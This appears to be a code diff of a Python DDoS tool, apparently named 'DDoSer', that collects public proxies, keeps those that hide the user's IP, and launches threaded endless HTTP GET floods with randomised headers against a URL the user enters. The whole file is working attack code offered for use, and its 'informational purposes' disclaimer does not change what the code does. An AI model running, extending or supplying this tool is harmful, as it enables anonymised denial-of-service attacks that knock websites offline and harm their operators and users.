@@ -1,8 +1,18 @@
 #!/usr/bin/python3
-import requests as r, os, threading, sys, random, re, time
+import requests as r, os, threading, sys, random, re, time, click
 from threading import Thread
 from colorama import Fore,Style
 from bs4 import BeautifulSoup
+
+def check_prox(array, qtime):
+	ip = r.post("http://v4.ident.me/").text
+	open("ddprox.txt", "w+").close()
+	for prox in array:
+		thread_list = []
+		t = threading.Thread (target=check, args=(ip, prox, qtime))
+		thread_list.append(t)
+		t.start()
+	time.sleep(qtime*4)
 
 def clear(): 
 	if os.name == 'nt': 
@@ -32,56 +42,93 @@ def randomString(size):
 		out_str += chr(a)
 	return(out_str)
 
-def ddos(ip, prox, url, timer):
-	useragent()
+def check(ip, prox, qtime):
 	try:
-		ipx = r.get("http://v4.ident.me/", proxies={'http':prox, 'https':prox}, verify=False, timeout=5).text
+		ipx = r.get("http://v4.ident.me/", proxies={'http':prox, 'https':prox}, verify=False, timeout=qtime).text
 	except:
 		ipx = ip
 	if ip != ipx:
-		proxies={}
-		proxies['http'] = prox
-		proxies['https'] = prox
-		colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.CYAN, Fore.MAGENTA, Fore.WHITE]
-		color = random.choice(colors)
-		headers = {
-				'User-Agent': random.choice(randuser),
-				'Cache-Control': 'no-cache',
-				'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
-				'Referer': 'http://www.google.com/?q=' + randomString(random.randint(5,10)),
-				'Keep-Alive': str(random.randint(110,120)),
-				'Connection': 'keep-alive'
-				}
-		while True:
-			try:
-				req = r.get(url, headers=headers)
-				req = r.get(url, headers=headers, proxies=proxies)
-				print(color+"{}  |  {}  |  localhost".format(req.status_code, url)+Style.RESET_ALL)
-				print(color+"{}  |  {}  |  {}".format(req.status_code, url, prox)+Style.RESET_ALL)
-				time.sleep(timer)
-			except:
-				continue
-
-clear()
-print(Fore.GREEN+"\n██████"+Fore.RED+"╗░"+Fore.GREEN+"██████"+Fore.RED+"╗░░"+Fore.GREEN+"█████"+Fore.RED+"╗░░"+Fore.GREEN+"██████"+Fore.RED+"╗"+Fore.GREEN+"███████"+Fore.RED+"╗"+Fore.GREEN+"██████"+Fore.RED+"╗░"+Fore.GREEN+"\n"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"╔════╝"+Fore.GREEN+"██"+Fore.RED+"╔════╝"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"\n"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║╚"+Fore.GREEN+"█████"+Fore.RED+"╗░"+Fore.GREEN+"█████"+Fore.RED+"╗░░"+Fore.GREEN+"██████"+Fore.RED+"╔╝"+Fore.GREEN+"\n"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║░╚═══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"╔══╝░░"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"\n"+Fore.GREEN+"██████"+Fore.RED+"╔╝"+Fore.GREEN+"██████"+Fore.RED+"╔╝╚"+Fore.GREEN+"█████"+Fore.RED+"╔╝"+Fore.GREEN+"██████"+Fore.RED+"╔╝"+Fore.GREEN+"███████"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"\n"+Fore.RED+"╚═════╝░╚═════╝░░╚════╝░╚═════╝░╚══════╝╚═╝░░╚═╝"+Fore.YELLOW+"\n\nDev: FSystem88 ~ [ prod. by Ca$h&Мир® ]"+Style.RESET_ALL)
-
-ip = r.post("http://v4.ident.me/").text
-proxurl = "https://api.proxyscrape.com/?request=displayproxies"
-req = r.get(proxurl)
-array = req.text.split()
-
-url = input("URL: ")
-timer = input("Time delay in seconds (default 1): ")
-try:
-	if timer == "":
-		timer = 1
+		print(Fore.GREEN+"{} good!".format(prox))
+		f = open("ddprox.txt", "a+")
+		f.write("{}\n".format(prox))
+		f.close()
 	else:
-		timer = int(timer)
-except ValueError:
-	print(Fore.RED+"INCORRECT TIME DELAY"+Style.RESET_ALL)
+		print(Fore.RED+"{} bad".format(prox))
 
-for prox in array:
-	thread_list = []
-	t = threading.Thread (target=ddos, args=(ip, prox, url, timer))
-	thread_list.append(t)
-	t.start()
+def ddos(prox, url):
+	useragent()
+	proxies={}
+	proxies['http'] = prox
+	proxies['https'] = prox
+	colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.CYAN, Fore.MAGENTA, Fore.WHITE]
+	color = random.choice(colors)
+	i = 0
+	headers = {
+			'User-Agent': random.choice(randuser),
+			'Cache-Control': 'no-cache',
+			'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
+			'Referer': 'http://www.google.com/?q=' + randomString(random.randint(5,10)),
+			'Keep-Alive': str(random.randint(110,120)),
+			'Connection': 'keep-alive'
+			}
+	while True:
+		try:
+			req = r.get(url, headers=headers, proxies=proxies, timeout=1)
+			if req.status_code == 200:
+				i += 1
+				if i %10 == 0:
+					print(color+"{} send {} requests...".format(prox, i))
+		except:
+			continue
+
+@click.command()
+@click.option('--proxy', help="File with a proxy")
+def main(proxy):
+	clear()
+	def logo():
+		print(Fore.GREEN+"\n██████"+Fore.RED+"╗░"+Fore.GREEN+"██████"+Fore.RED+"╗░░"+Fore.GREEN+"█████"+Fore.RED+"╗░░"+Fore.GREEN+"██████"+Fore.RED+"╗"+Fore.GREEN+"███████"+Fore.RED+"╗"+Fore.GREEN+"██████"+Fore.RED+"╗░"+Fore.GREEN+"\n"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"╔════╝"+Fore.GREEN+"██"+Fore.RED+"╔════╝"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"\n"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║╚"+Fore.GREEN+"█████"+Fore.RED+"╗░"+Fore.GREEN+"█████"+Fore.RED+"╗░░"+Fore.GREEN+"██████"+Fore.RED+"╔╝"+Fore.GREEN+"\n"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║░╚═══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"╔══╝░░"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"\n"+Fore.GREEN+"██████"+Fore.RED+"╔╝"+Fore.GREEN+"██████"+Fore.RED+"╔╝╚"+Fore.GREEN+"█████"+Fore.RED+"╔╝"+Fore.GREEN+"██████"+Fore.RED+"╔╝"+Fore.GREEN+"███████"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"\n"+Fore.RED+"╚═════╝░╚═════╝░░╚════╝░╚═════╝░╚══════╝╚═╝░░╚═╝"+Fore.YELLOW+"\n\n[ Dev: FSystem88 ~ prod. by Ca$h&Мир® ]\n[ The program uses a simple type of DDoS attack \"HTTP flood\" using multithreading and a proxies ]\n[ The program was created for informational purposes !!! ]\n"+Style.RESET_ALL)
+	logo()
+	url = input("URL: ")
+	if url[:4] != "http":
+		print(Fore.RED+"Enter the full link (example: http*://****.**/)"+Style.RESET_ALL)
+		exit()
+	qtime = input("Timeout of requests (default 5): ")
+	try:
+		if qtime == "":
+			qtime = 5
+		else:
+			qtime = int(qtime)
+	except:
+		print(Fore.RED+"Incorrect timeout"+Style.RESET_ALL)
+		exit()
+	if proxy == None:
+		req = r.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http")
+		array = req.text.split()
+		check_prox(array, qtime)
+		proxfile = "ddprox.txt"
+	else:
+		try:
+			fx = open(proxy)
+			array = fx.read().split()
+			val = input("Found {} proxies in {}.\nCheck the proxy for validity? (y/n)".format(len(array), proxy))
+			if val == "y":
+				check_prox(array, qtime)
+			else:
+				print(Fore.YELLOW+"Cancel...")
+			proxfile = proxy
+		except FileNotFoundError:
+			print(Fore.RED+"File {} not found. ".format(proxy)+Style.RESET_ALL)
+			exit()
+	clear()
+	logo()
+	fx = open(proxfile)
+	xprox = fx.read().split()
+	print(Fore.YELLOW+"URL: {}".format(url))
+	print("Found {} proxies. Let's go...".format(len(xprox)))
+	for prox in xprox:
+		thread_list = []
+		t = threading.Thread (target=ddos, args=(prox, url))
+		thread_list.append(t)
+		t.start()
+
+main()
